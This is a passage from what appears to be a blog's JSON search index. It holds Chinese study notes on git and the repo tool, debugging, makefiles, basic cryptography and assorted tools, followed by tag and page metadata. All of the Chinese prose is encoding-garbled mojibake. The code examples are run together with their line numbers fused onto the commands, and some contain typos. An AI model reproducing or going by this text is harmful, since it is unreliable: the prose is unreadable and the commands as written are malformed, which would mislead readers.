æŸ¥æ‰¾åˆ°ï¼Œå¦‚æœä¸æƒ³è‡ªå·±é…ç½®ï¼Œç›´æ¥ clone/fork ä¸€ä¸ªå…¶ä»–äººçš„ã€‚ bash å‰é¢çš„ä¸€ä¸²çš„ä¿®æ”¹ 1PS1=&quot;user&gt;&quot; æˆ‘ä»¬shell å‰é¢çš„ä¸€ä¸² é—®é¢˜ï¼šå¦‚ä½•åœ¨æœ¬æœºå’ŒæœåŠ¡å™¨åŒæ—¶ä½¿ç”¨tmux ç›¸åŒçš„é…ç½®ä¼šå¯èƒ½äº§ç”Ÿå†²çªï¼Œæˆ–è€…ä¼šä½¿æˆ‘ä»¬ä¸çŸ¥é“æ“ä½œçš„æ˜¯å“ªä¸€ä¸ªï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸åŒçš„é…ç½®æ–‡ä»¶ã€‚æœ€ç®€å•çš„å°±æ˜¯ä½¿ç”¨ä¸¤ä¸ª prefix ã€‚ lecture6: virsion control(git) gitç‰ˆæœ¬æ§åˆ¶ å¼€å‘é¡¹ç›®ï¼Œå›¢é˜Ÿåˆä½œï¼Œæ–‡ä»¶æŸåçš„å›é€€ã€‚ã€‚ã€‚gitéƒ½å¯ä»¥åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå¸®åŠ©æˆ‘ä»¬ï¼Œä¸éœ€è¦åˆ é™¤åœ¨é‡æ–°ä¸‹è½½ğŸ˜˜ git æŠ½è±¡å»ºæ¨¡ã€‚ä½¿ç”¨æœ‰å‘æ— ç¯å›¾è¿›è¡ŒæŠ½è±¡ é¡¶å±‚rootï¼Œæ–‡ä»¶å¤¹æŠ½è±¡ä¸ºtree, æ–‡ä»¶æŠ½è±¡ä¸ºblob commit: æ¯æ¬¡commit äº§ç”Ÿä¸€ä¸ªç±»ä¼¼ snapshot(å¿«ç…§)çš„ä¸œè¥¿ï¼Œä¿å­˜å½“å‰çš„çŠ¶æ€ä»¥åŠä¸€äº›ä¿¡æ¯(ä½œè€…ï¼Œæè¿°â€¦)ã€‚ é€šè¿‡ mapping&lt;string, object&gt; è¿›è¡Œç®¡ç†.stringæŒ‡æ–‡ä»¶çš„å“ˆå¸Œå€¼(SHA-1)ï¼Œobjectæ˜¯æˆ‘ä»¬æ–‡ä»¶ä¿å­˜çš„åœ°å€(â€˜snapshotâ€™åœ¨ç£ç›˜ä¸­çš„åœ°å€)ã€‚æ¯æ¬¡ä¿®æ”¹ï¼Œcommitä¼šäº§ç”Ÿæ–°çš„hash reference: gitéœ€è¦çš„æ˜¯æ–‡ä»¶çš„å“ˆå¸Œå€¼ï¼Œå¯¹äºäººç±»æ¯«æ— æ„ä¹‰ï¼Œå› æ­¤å­˜åœ¨å¦ä¸€ä¸ª mapping&lt;string, string&gt; ã€‚æˆ‘ä»¬ä½¿ç”¨å¯ä»¥äººç±»æ–¹ä¾¿é˜…è¯»çš„å­—ç¬¦ä¸²ï¼Œæ˜ å°„åˆ°hashï¼Œç„¶ååœ¨å¯»æ‰¾åˆ°æ–‡ä»¶ git å‡ ä¸ªçŠ¶æ€ï¼Œå¯ä»¥çœ‹çœ‹ Gitå·¥ä½œæµå’Œæ ¸å¿ƒåŸç†ï¼Œéå¸¸æœ‰è¶£ã€‚åœ¨å­¦ä¹ æ—¶ï¼Œå¯ä»¥æƒ³è±¡ä¸€ä¸‹æœ‰å‘æ— ç¯å›¾è¿›è¡Œç†è§£ã€‚ å·¥ä½œåŒº æš‚å­˜åŒº æœ¬åœ°ä»“åº“ è¿œç¨‹ä»“åº“ git çš„é…ç½® 123# é…ç½®ç”¨æˆ·åï¼Œé‚®ç®±ã€‚è‡ªå·±çš„è´¦æˆ·ã€‚git config --global user.name &quot;your name&quot;git config --global user.email &quot;your email&quot; åˆ›å»ºä¸€ä¸ªgitä»“åº“ 123456mkdir democd demogit init # æœ¬åœ°ä»“åº“åˆå§‹åŒ–ï¼Œå‡ºç°ä¸€ä¸ª `.git` çš„ç›®å½•git status # æŸ¥çœ‹ä»“åº“çŠ¶æ€ï¼Œéå¸¸å¸¸ç”¨ æ—¥å¿—ï¼ŒæŸ¥çœ‹æäº¤çš„æ–‡ä»¶ 12# oneline å»é™¤ä¸€å®šçš„ä¿¡æ¯git log --all --graph --decorate --oneline å…¶ä¸­å­˜åœ¨ä¸€ä¸ª HEAD æŒ‡é’ˆæŒ‡å‘å½“å‰å·¥ä½œçš„åˆ†æ”¯ã€‚ æˆ‘ä»¬æƒ³å¿½ç•¥æŸäº›æ–‡ä»¶æ—¶ 1234# ä½¿ç”¨ gitignore æ–‡ä»¶é…ç½®touch .gitignore*.jpg # å¿½ç•¥æ‰€æœ‰çš„ jpgæ–‡ä»¶ æœ¬åœ°æ“ä½œ 12345678910git init# å†™ç‚¹æ–°æ–‡ä»¶echo &quot;hello&quot; &gt; readme.md # å¤„äºuntracked çŠ¶æ€ï¼Œä½¿ç”¨git status ä¼šå­˜åœ¨æç¤º# æš‚å­˜åŒºgit add readme.txt # å¤„äºtracked çŠ¶æ€# æäº¤åˆ°æœ¬åœ°ä»“åº“git commit # è¿›å…¥æ–‡ä»¶ï¼Œè¿›è¡Œæè¿°ä¿®æ”¹çš„å†…å®¹ -m &quot;message&quot; # message ä»£è¡¨æè¿°ï¼Œç®€çŸ­æè¿°å¯ä»¥è¿™æ ·ä½¿ç”¨ æäº¤åˆ°è¿œç¨‹ä»£ç ä»“åº“ 123456789101112131415161718192021# 1. è¿œç¨‹åˆ›å»ºåç›´æ¥cloneä¸‹æ¥ï¼Œç„¶åå†å†™å†…å®¹git clone &quot;your-repo&quot;git remote -v # æŸ¥çœ‹å’Œé‚£äº›ä»“åº“æœ‰è”ç³»git push # æœ‰.gitæ–‡ä»¶å¤¹ï¼Œå¯ä»¥æ‰¾åˆ°ä»“åº“æäº¤# 2. æˆ‘ä»¬åœ¨æœ¬åœ°å†™äº†å¾ˆå¤šæ–‡ä»¶ï¼Œä½†æ˜¯ä¸­é€”æƒ³èµ·æ¥æ²¡æœ‰ä½¿ç”¨gitï¼Œæˆ‘ä»¬å¦‚ä½•åšï¼Ÿ## è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»ºä»“åº“## ç„¶åå†æœ¬åœ°git initgit add .git commitgit remote add &quot;name&quot; git@&lt;your-repo&gt; # å…³è”è¿œç¨‹ä»“åº“ã€‚ # name è‡ªå·±å–ï¼Œå¯ä»¥å…³è”å¾ˆå¤šä»“åº“ï¼Œæ ¹æ®åå­—åŒºåˆ†## ä½†æ˜¯æœ¬åœ°ä»“åº“ä¸€èˆ¬æ˜¯masterï¼ŒæŸäº›å¹³å°æ˜¯main(ä¹Ÿå¯ä»¥é€‰ï¼Œä½†æ˜¯é»˜è®¤æ˜¯main)ï¼Œè¿™ä¸€æ­¥å¯èƒ½å‡ºé”™ï¼Œéœ€è¦åˆ‡æ¢åˆ†æ”¯ `git checkout -b main`## è¿œç¨‹åˆ†æ”¯ä¸å­˜åœ¨ä¼šåˆ›å»ºä¸€ä¸ªgit push &quot;ä»“åº“åç§°&quot; &quot;æœ¬åœ°åˆ†æ”¯å&quot;:&quot;è¿œç¨‹åˆ†æ”¯å&quot; # å¦‚æœæœ¬åœ°åˆ†æ”¯åä¸è¿œç¨‹åˆ†æ”¯åç›¸åŒï¼Œåˆ™å¯ä»¥çœç•¥å†’å·## åˆ é™¤è¿œç¨‹ä»“åº“git remote rm &quot;ä»“åº“å&quot; ä»è¿œç¨‹ä»“åº“åˆ°å·¥ä½œåŒºã€‚æ¯”å¦‚å›¢é˜Ÿåˆä½œä¸­ï¼Œè¿œç¨‹ä»“åº“æ›´æ–°äº†ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåŒæ­¥ã€‚ 1234567891011# ç›´æ¥åŒæ­¥åˆ°æœ¬åœ°ï¼Œä¼šç›´æ¥æ›´æ–°æœ¬åœ°æ–‡ä»¶git pull# ç”±äºpull ä¸€æ­¥åˆ°ä½ï¼Œä¹Ÿå¯åˆ†æ­¥è¿›è¡Œ## å…ˆæ›´æ–°åˆ°åˆ°æœ¬åœ°ä»“åº“git fetch## diff å¯¹æ¯”åŒºåˆ«git diff # æŸ¥çœ‹æœ¬åœ°ä»“åº“å’Œå·¥ä½œåŒºçš„åŒºåˆ«## pull åˆå¹¶ = git fetch + git mergegit pull åˆ†æ”¯æ“ä½œã€‚æˆ‘ä»¬å‚ä¸å¼€æºé¡¹ç›®æ—¶ï¼Œå»ºè®®åˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯pushï¼Œç”±é¡¹ç›®è´Ÿè´£äººå†³å®šæ˜¯å¦åˆå¹¶(merge)ã€‚ 12345678910git branch &quot;name&quot; # åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ -vv # æŸ¥çœ‹åˆ†æ”¯ä¿¡æ¯git checkout &quot;name&quot; # åˆ‡æ¢åˆ†æ”¯ -d &quot;name&quot; # åˆ é™¤åˆ†æ”¯ -D &quot;name&quot; # æš´åŠ›åˆ é™¤ -b &quot;name&quot; # åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ç„¶ååˆ‡æ¢git merge # å°†åˆ«çš„åˆ†æ”¯åˆå¹¶åˆ° `å½“å‰åˆ†æ”¯` ä¸­ # å¯èƒ½ä¼šå­˜åœ¨å†²çªï¼Œåœ¨æŸä¸€ä¸ªç›¸åŒçš„ä½ç½®å­˜åœ¨ä¸åŒçš„å†…å®¹.ä¿å­˜çš„è¯ï¼Œè‡ªå·±å†³å®šç„¶åä¿®æ”¹å†²çªæ–‡ä»¶å°±è¡Œ git clone ä¼šå¤åˆ¶è¿œç¨‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…å«å…¶æ‰€æœ‰çš„ snapshot æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ --shallow å¿½ç•¥è¿™äº› git å›æ»šï¼šå½“æˆ‘ä»¬åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸­commitåå‘ç°ä¸€ä¸ªå·¨å¤§çš„é”™è¯¯ï¼Œéœ€è¦å›é€€åˆ°ä¹‹å‰çš„ç‰ˆæœ¬ã€‚æ”¹å˜ HEAD æŒ‡é’ˆ 123456789101112git stash # å›é€€åˆ°ä¸Šä¸€ä¸ªcommit ç‰ˆæœ¬git bisect # æ¯”è¾ƒå¼ºå¤§çš„å·¥å…·git reset --hard # ä¼šä¸¢å¤±æœ€æ–°çš„ä»£ç ä¿®æ”¹ --soft # å°† HEAD æŒ‡é’ˆå›é€€åˆ°æŒ‡å®šæäº¤ï¼Œä¸æ”¹å˜æš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å†…å®¹ HEAD^ # ä¸Šä¸€ä¸ª ç‰ˆæœ¬ HEAD~&lt;num&gt; # å›é€€numä¸ªç‰ˆæœ¬ &lt;hash&gt; # å›é€€åˆ°æŒ‡å®šå“ˆå¸Œå€¼çš„ç‰ˆæœ¬git revert -n hash # å°†ç‰ˆæœ¬å¤åˆ¶ä¸€ä»½ï¼Œä¸ä¼šé”€æ¯ ç°åœ¨çš„IDEä¸­å­˜åœ¨gitç›¸å…³çš„å·¥å…·ï¼Œä¹Ÿæ›´åŠ æ–¹ä¾¿äº†æˆ‘ä»¬çš„ä½¿ç”¨ã€‚ ä¹Ÿå­˜åœ¨å…¶ä½™çš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œsvn, repoâ€¦â€¦ repo ä½¿ç”¨ repo æ›´é€‚åˆå¤šä¸ªä»“åº“çš„ç®¡ç†ï¼Œå¹³å¸¸æˆ‘ä»¬è§çš„é¡¹ç›®éƒ½æ˜¯ä¸€ä¸ªä»“åº“ã€‚ä½†æ˜¯å‘Androidè¿™æ ·çš„ä¾èµ–ä¸Šç™¾ä¸ªgitä»“åº“æ¥è¯´ï¼Œä¾é gitå¹¶ä¸æ˜¯å¤šä¹ˆå¥½ä½¿ç”¨ï¼Œå› æ­¤google å¼€å‘äº†repoå·¥å…·ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªpythonè„šæœ¬ï¼ŒåŸºäºgitã€‚ åˆå§‹åŒ– 1234repo init -u git@&lt;repo&gt;/mainfest.git # é»˜è®¤ä¸ºgoogleçš„ä»“åº“ https://gerrit.googlesource.com/git-repo # è¿™ä¸ªç›®å½•ä¸‹æœ€ç®€å•åªéœ€è¦ default.xml -b # æŒ‡å®šbranch -uåçš„ä»“åº“, xmlæ–‡ä»¶(é»˜è®¤default.xml, æˆ‘ä»¬å¯ä»¥è‡ªå·±é€‰æ‹©)ï¼Œç„¶åæˆ‘ä»¬æ‹‰å–çš„æ—¶å€™ä¼šå°†æ‰€æœ‰çš„gitä»“åº“æ‹‰å–ä¸‹æ¥ 12repo init -u &lt;repo&gt; -m æŒ‡å®šxmlæ–‡ä»¶ æ‹‰å–ä»£ç åˆ°æœ¬åœ° 1repo sync -c åˆ†æ”¯ 123repo branch # æŸ¥çœ‹åˆ†æ”¯repo start &lt;branch_name&gt; --all # åˆ›å»ºåˆ†æ”¯å¹¶è¿›å…¥ lecture7: debugging &amp; profiling è°ƒè¯•ç¨‹åºä»¥åŠæ€§èƒ½åˆ†æ æŸ¥çœ‹æ—¥å¿—ï¼Œæ‰“å°æ—¥å¿—ï¼Œåˆ¶ä½œæ—¥å¿— è°ƒè¯•å™¨ GNU gdbï¼Œå¯ä»¥è°ƒè¯•å‡ ä¹æ‰€æœ‰çš„äºŒè¿›åˆ¶ç¨‹åº python pdbï¼Œpythonè°ƒè¯• æµè§ˆå™¨è°ƒè¯•js æ€§èƒ½æµ‹è¯• æµ‹è¯•ä¸€ä¸ªç¨‹åºè¿è¡Œ time lecture8: metaprogramming å¦‚ä½•æ›´é«˜çš„ç®¡ç†é¡¹ç›®ã€æµ‹è¯•ã€ä¾èµ–ç®¡ç†ã€‚ä½¿ç”¨ makefile makefile çš„ä½¿ç”¨æ¯”è¾ƒç®€å•ã€‚ 12345ç›®æ ‡: ä¾èµ– å‘½ä»¤ //å‰é¢å¿…é¡»æ˜¯tabé”®main: main.c gcc main.c -o mian ä¸€äº›è¯­æ³• 123456$^ æ‰€æœ‰çš„ä¾èµ–é¡¹$&lt; ä¸€ä¸ªä¾èµ–é¡¹$@ ç›®æ ‡æ–‡ä»¶echo æ‰“å°% é€šé…ç¬¦* ä¹Ÿæ˜¯é€šé…ç¬¦ æˆ‘ä»¬ç¼–è¯‘æŸäº›å¼€æºé¡¹ç›®æ—¶ä¹Ÿä¼šä½¿ç”¨ make å‘½ä»¤ï¼Œå¯ä»¥çœ‹çœ‹åˆ«äººæ€ä¹ˆå†™çš„ã€‚ å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–çš„é€‰æ‹©ï¼Œæ¯”å¦‚ cmake lecture9: security &amp; crypto å®‰å…¨å¾ˆå¤šï¼Œä¹Ÿæ˜¯ä¸€é—¨ä¸“é—¨çš„å­¦ç§‘ï¼Œæƒ³è¦æ·±å…¥å°±éœ€è¦å­¦ä¸“ä¸šè¯¾ hash: ç”¨ä½œä¿¡æ¯æ‘˜è¦ï¼Œç­¾åï¼Œæ£€æŸ¥æ–‡ä»¶çš„å®Œæ•´æ€§ã€‚ md5 sha-1/2/3 å¯¹ç§°åŠ å¯† DES AES éå¯¹ç§°åŠ å¯† RSA ECC æ•°å­—ç­¾å lecture10: potpourri å¤§æ‚çƒ©ï¼šè®²è¿°ä¸€äº›æ¦‚å¿µï¼Œç†Ÿç»ƒè¿˜å¾—åœ¨ä»¥åå¤šç»ƒä¹  é”®ç›˜æ˜ å°„ é”®ç›˜ä¸Šçš„Caps Lockå‡ ä¹ä¸æ€ä¹ˆä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°é…ç½®ä¸€ä¸‹(æ¯”å¦‚æ¯”è¾ƒå°çš„Esc)ï¼Œè®©å…¶å‘æŒ¥ä½œç”¨ å®ˆæŠ¤è¿›ç¨‹ï¼Œdaemon APIs æ¯”å¦‚è¯´éƒ¨åˆ†å¤©æ°”çš„APIï¼Œæˆ‘ä»¬åªéœ€è¦è¯·æ±‚ç‰¹å®šçš„URLå¸¦ç€æ­£ç¡®çš„å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å¾—è¿”å›ç»“æœã€‚ å‘½ä»¤è¡Œå‚æ•° æˆ‘ä»¬ä½¿ç”¨çš„å‘½ä»¤å¯ä»¥å¸¦æœ‰å‚æ•° Window Manage VPN Jupyter Notebook: äº¤äº’å¼ç¼–ç¨‹ GitHub: ä»£ç æ‰˜ç®¡å¹³å° åˆ›å»ºè‡ªå·±çš„ä»“åº“ æissueï¼Œè§£å†³é—®é¢˜ pr: pull requestï¼Œè‡ªå·±å†™çš„æäº¤ç»™ä½œè€… merge åˆ«äººçš„è¯·æ±‚ lecture11: Q&amp;A æ¥è‡ªå­¦ç”Ÿçš„é—®é¢˜ å¦‚ä½•è¿›è¡Œæ“ä½œç³»ç»Ÿçš„å­¦ä¹ ï¼Ÿ learn by exercise: å­¦ä¹ æ¯”è¾ƒå‡ºåçš„ OS è¯¾ç¨‹ï¼Œå®Œæˆç›¸åº”çš„labï¼Œå®ç°è‡ªå·±çš„OS â€¦â€¦ è‡ªå·±çœ‹çœ‹å°±è¡Œ","link":"/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/"}],"tags":[{"name":"blog","slug":"blog","link":"/tags/blog/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"kernel pwn","slug":"kernel-pwn","link":"/tags/kernel-pwn/"},{"name":"db","slug":"db","link":"/tags/db/"},{"name":"asm","slug":"asm","link":"/tags/asm/"},{"name":"CS","slug":"CS","link":"/tags/CS/"}],"categories":[{"name":"misc","slug":"misc","link":"/categorievariants/misc/"},{"name":"pwn","slug":"pwn","link":"/categorievariants/pwn/"},{"name":"kernel uaf","slug":"kernel-uaf","link":"/categorievariants/kernel-uaf/"},{"name":"db","slug":"db","link":"/categorievariants/db/"},{"name":"asm","slug":"asm","link":"/categorievariants/asm/"},{"name":"CS","slug":"CS","link":"/categorievariants/CS/"}],"pages":[{"title":"archives","text":"","link":"/archives/index.html"},{"title":"about","text":"ä¿¡æ¯å®‰å…¨ä¸“ä¸š2021çº§æœ¬ç§‘ç”Ÿã€‚","link":"/about/index.html"},{"title":"Categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}]}